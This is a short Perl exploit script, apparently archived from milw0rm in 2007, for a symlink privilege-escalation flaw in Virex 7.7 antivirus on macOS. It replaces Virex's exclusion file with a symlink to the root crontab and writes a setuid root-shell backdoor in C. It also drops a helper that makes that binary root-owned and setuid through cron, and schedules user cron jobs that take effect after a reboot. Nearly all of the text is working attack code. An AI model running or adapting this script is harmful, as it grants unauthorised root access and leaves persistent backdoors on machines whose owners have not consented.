#!/usr/bin/perl
#
# http://www.digitalmunition.com
# written by kf (kf_lists[at]digitalmunition[dot]com)
#
# Following symlinks is bad mmmmmmmmmmkay!
#

$dest = "/var/cron/tabs/root";

$tgts{"0"} = "Virex 7.7.dmg:\"/Library/Application
Support/Virex/VShieldExclude.txt\"  ";

unless (($target) = @ARGV) {
       print "\n\nUsage: $0 <target> \n\nTargets:\n\n";

       foreach $key (sort(keys %tgts)) {
               ($a,$b) = split(/\:/,$tgts{"$key"});
               print "\t$key . $a\n";
       }

       print "\n";
       exit 1;
}

($a,$b) = split(/\:/,$tgts{"$target"});
print "*** Target: $a $b\n";

# Set aside a backdoor that we will chmod and chown later
open(BD,">/tmp/pwnrex.c");
printf BD "main()\n";
printf BD "{ seteuid(0); setegid(0); setuid(0); setgid(0);
system(\"/bin/sh -i\"); }\n";
#system("gcc -o /Users/Shared/shX /tmp/pwnrex.c");
system("cp /usr/bin/id  /Users/Shared/shX");  # this is for those without gcc.

# set aside root crontab dropper
open(PH,">/Users/Shared/droptab.pl");
print PH "system\(\"echo \'* * * * * /usr/sbin/chown root: /Users/Shared/shX; /bin/chmod 4755 /Users/Shared/shX\' > /var/cron/tabs/root\"\)\;\n";

# rm the existing log file and symlink it to the root crontab file. A
reboot will be required to exploit this.
system("rm -rf $b; ln -s $dest $b");

# start up a crontab request that will be *VERY* useful after the machine has rebooted.
system("echo '* * * * * /usr/bin/perl /Users/Shared/droptab.pl; sleep 90; crontab /Users/Shared/xxx' > /tmp/user_cron");
system("echo '* * * * * /usr/bin/id' >  /Users/Shared/xxx");
system("crontab /tmp/user_cron");

print "wait for a reboot and a cron run...\n"

# milw0rm.com [2007-02-28]
